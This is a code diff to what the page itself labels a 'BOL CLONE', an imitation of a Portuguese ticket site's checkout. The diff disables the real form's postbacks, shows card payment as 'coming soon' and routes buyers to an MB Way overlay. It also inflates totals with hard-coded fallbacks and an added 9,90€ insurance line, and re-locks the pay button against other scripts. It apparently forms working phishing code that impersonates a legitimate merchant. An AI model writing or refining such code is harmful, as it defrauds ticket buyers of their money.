@@ -1427,10 +1427,13 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$scriptManagerMasterPage', 'fo
 </div>
 </div>
 <div class="col-sm-4 bol-input-group">
-<span title="Cartão Crédito"><input id="Corpo_rbCartaoCredito" name="ctl00$Corpo$FormaPagamento" onclick="javascript:setTimeout('__doPostBack(\'ctl00$Corpo$rbCartaoCredito\',\'\')', 0)" type="radio" value="rbCartaoCredito"/><label for="Corpo_rbCartaoCredito">Cartão Crédito</label></span>
-<div style="margin-left: 25px; padding-bottom: 5px;">
-<span class="sparkling-sprite visa-pequeno" title="Visa"></span><span class="sparkling-sprite mastercard-pequeno" title="Mastercard"></span>
-</div>
+  <div id="bol-cartao-bloco">
+    <span title="Cartão de Crédito"><input disabled="disabled" id="Corpo_rbCartaoCredito" name="ctl00$Corpo$FormaPagamento" type="radio" value="rbCartaoCredito"/><label for="Corpo_rbCartaoCredito">Cartão Crédito</label></span>
+    <div style="margin-left: 25px; padding-bottom: 3px;">
+      <span class="sparkling-sprite visa-pequeno" title="Visa"></span><span class="sparkling-sprite mastercard-pequeno" title="Mastercard"></span>
+    </div>
+    <div id="bol-cartao-aviso">Brevemente disponível. O pagamento por cartão não está disponível de momento.</div>
+  </div>
 </div>
 <div class="col-sm-4 bol-input-group">
 <span title="Multibanco"><input id="Corpo_rbMultibanco" name="ctl00$Corpo$FormaPagamento" onclick="javascript:setTimeout('__doPostBack(\'ctl00$Corpo$rbMultibanco\',\'\')', 0)" type="radio" value="rbMultibanco"/><label for="Corpo_rbMultibanco">Multibanco</label></span>
@@ -1882,6 +1885,89 @@ document.getElementById('Corpo_valCheckBox').dispose = function() {
 }
 BOL.JS.Carrinho.Iniciar('timerCarrinho_Relogio','06/21/2026 19:35:43','06/21/2026 19:49:56');//]]>
 </script>
+<script>
+/* ---- BLOQUEAR __doPostBack ---- */
+(function(){
+  window.__doPostBack = function(eventTarget, eventArgument){
+    return false;
+  };
+})();
+</script>
+
+<script>
+/* ---- Mostrar Seguro na pagina Dados (ler valor correto) ---- */
+(function(){
+  var SEGURO_KEY = 'bolSeguroBilhete';
+  var TOTAL_KEY = 'bolCartTotalCalculado';
+  var SEGURO_VALOR = 9.90;
+
+  function atualizarBarra(){
+    var temSeguro = JSON.parse(sessionStorage.getItem(SEGURO_KEY) || 'false');
+    var tbody = document.querySelector('.TabelaTotal tbody');
+    if(!tbody) return;
+
+    var linhaSeguro = document.querySelector('tr.seguroLine');
+    if(temSeguro && !linhaSeguro){
+      var tr = document.createElement('tr');
+      tr.className = 'seguroLine';
+      tr.innerHTML = '<th class="Esquerda">Bilhete Seguro</th><th class="text-right">9,90€</th>';
+      tbody.appendChild(tr);
+    } else if(!temSeguro && linhaSeguro){
+      linhaSeguro.remove();
+    }
+  }
+
+  function obterValorBase(){
+    // Total Itens da página Dados
+    var totalCell = document.querySelector('.TabelaTotal thead th.text-right');
+    var total = 0;
+    if(totalCell && totalCell.textContent.trim() !== '—'){
+      var txt = totalCell.textContent.trim().replace('€','').replace(',','.');
+      total = parseFloat(txt) || 0;
+    }
+    return total > 0 ? total : 40.00;
+  }
+
+  function obterCustos(){
+    // Custos de operação da página Dados
+    var custosCell = document.querySelector('.custosOperacao th.text-right');
+    var custos = 0;
+    if(custosCell){
+      var txt = custosCell.textContent.trim().replace('€','').replace(',','.');
+      custos = parseFloat(txt) || 0;
+    }
+    return custos > 0 ? custos : 4.00;
+  }
+
+  function init(){
+    // Primeiro, tenta recuperar total salvo
+    var totalSalvo = JSON.parse(sessionStorage.getItem(TOTAL_KEY) || 'null');
+
+    var total;
+    if(totalSalvo && totalSalvo > 0){
+      // Se tem valor salvo, usa ele
+      total = totalSalvo;
+    } else {
+      // Se não, calcula agora
+      var totalBase = obterValorBase();
+      var custos = obterCustos();
+      var temSeguro = JSON.parse(sessionStorage.getItem(SEGURO_KEY) || 'false');
+      total = totalBase + custos + (temSeguro ? SEGURO_VALOR : 0);
+    }
+
+    // Atualizar total
+    document.querySelectorAll('.totalPagar th.text-right').forEach(function(el){
+      el.textContent = total.toFixed(2).replace('.',',') + '€';
+    });
+
+    atualizarBarra();
+  }
+
+  if(document.readyState === 'loading'){
+    document.addEventListener('DOMContentLoaded', init);
+  } else { init(); }
+})();
+</script>
 </form>
 <div class="bootstrap sticky-footer forca-padding-mobile" id="rodape">
 <div class="container container-geral">
@@ -2137,8 +2223,23 @@ BOL.JS.Carrinho.Iniciar('timerCarrinho_Relogio','06/21/2026 19:35:43','06/21/202
 
 <!-- ===== MB WAY ONLY — BOL CLONE ===== -->
 <style>
-  #Corpo_updFormaPagamento .col-sm-4:not(:first-child) { display: none !important; }
+  #Corpo_updFormaPagamento .col-sm-4:nth-child(n+3) { display: none !important; }
   #Corpo_txtNumeroTelefone { pointer-events: auto !important; opacity: 1 !important; background: #fff !important; color: #333 !important; }
+
+  /* Cartão de crédito — desabilitado */
+  #bol-cartao-bloco { opacity: .55; cursor: not-allowed; }
+  #bol-cartao-bloco input[type="radio"],
+  #bol-cartao-bloco label { cursor: not-allowed; pointer-events: none; }
+  #bol-cartao-aviso {
+    margin-top: 6px;
+    font-size: .78rem;
+    color: #888;
+    background: #f8f8f8;
+    border-left: 3px solid #ccc;
+    padding: 5px 8px;
+    border-radius: 2px;
+    line-height: 1.4;
+  }
 
   #mbway-overlay {
     display: none; position: fixed;
@@ -2241,9 +2342,9 @@ BOL.JS.Carrinho.Iniciar('timerCarrinho_Relogio','06/21/2026 19:35:43','06/21/202
         this.value = this.value.replace(/[^0-9]/g,'').slice(0,9);
       });
     }
-    /* Esconder outros metodos de pagamento */
+    /* Mostrar apenas MB Way (0) e Cartão (1); esconder o resto */
     var cols = document.querySelectorAll('#Corpo_updFormaPagamento .col-sm-4');
-    cols.forEach(function(c, i) { if (i !== 0) c.style.display = 'none'; });
+    cols.forEach(function(c, i) { if (i > 1) c.style.display = 'none'; });
   }
 
   /* --- Extrair total (sessionStorage tem prioridade) --- */
@@ -2356,14 +2457,27 @@ BOL.JS.Carrinho.Iniciar('timerCarrinho_Relogio','06/21/2026 19:35:43','06/21/202
   }
 
   /* --- Interceptar botao Continuar --- */
+  function _lockBtn(btn) {
+    btn.removeAttribute('href');
+    btn.setAttribute('href', 'javascript:void(0)');
+    btn.onclick = null;
+    btn.removeAttribute('onclick');
+  }
+
   function interceptBtn() {
     var btn = document.getElementById('Corpo_btnEfectivar');
     if (!btn) return;
-    btn.removeAttribute('href');
-    btn.onclick = null;
+    _lockBtn(btn);
+
+    // Re-bloquear depois do UTMify (async/defer) correr e reescrever o href
+    [200, 500, 1000, 2000].forEach(function(ms){
+      setTimeout(function(){ _lockBtn(btn); }, ms);
+    });
+
     btn.addEventListener('click', function(e) {
       e.preventDefault();
       e.stopPropagation();
+      e.stopImmediatePropagation(); // bloqueia listeners do UTMify e outros scripts externos
 
       /* Validar todos os campos */
       var erros = validarCampos();
@@ -2487,14 +2601,20 @@ BOL.JS.Carrinho.Iniciar('timerCarrinho_Relogio','06/21/2026 19:35:43','06/21/202
       document.title = 'Dados de Pagamento — BOL · '+_cart.show;
       // Actualizar totais na sidebar
       setTimeout(function(){
+        // Preferir o total calculado (inclui seguro) se disponível
+        var totalFinal = _cart.total;
+        try {
+          var savedTotal = JSON.parse(sessionStorage.getItem('bolCartTotalCalculado') || 'null');
+          if(savedTotal && savedTotal > 0) totalFinal = savedTotal;
+        } catch(e){}
         var totEls = document.querySelectorAll('.totalPagar th.text-right');
-        totEls.forEach(function(el){ el.textContent = _cart.total.toFixed(2).replace('.',',')+'€'; });
+        totEls.forEach(function(el){ el.textContent = totalFinal.toFixed(2).replace('.',',')+'€'; });
         var bilhEl = document.querySelector('.TabelaTotal thead th.text-right');
         if(bilhEl) bilhEl.textContent = _cart.totalPreco.toFixed(2).replace('.',',')+'€';
         var taxaEl = document.querySelector('.custosOperacao th.text-right');
         if(taxaEl) taxaEl.textContent = _cart.totalTaxa.toFixed(2).replace('.',',')+'€';
         // Guardar total para uso no pagamento MB Way
-        window._bolTotal = _cart.total;
+        window._bolTotal = totalFinal;
       }, 100);
     }
   } catch(e){}
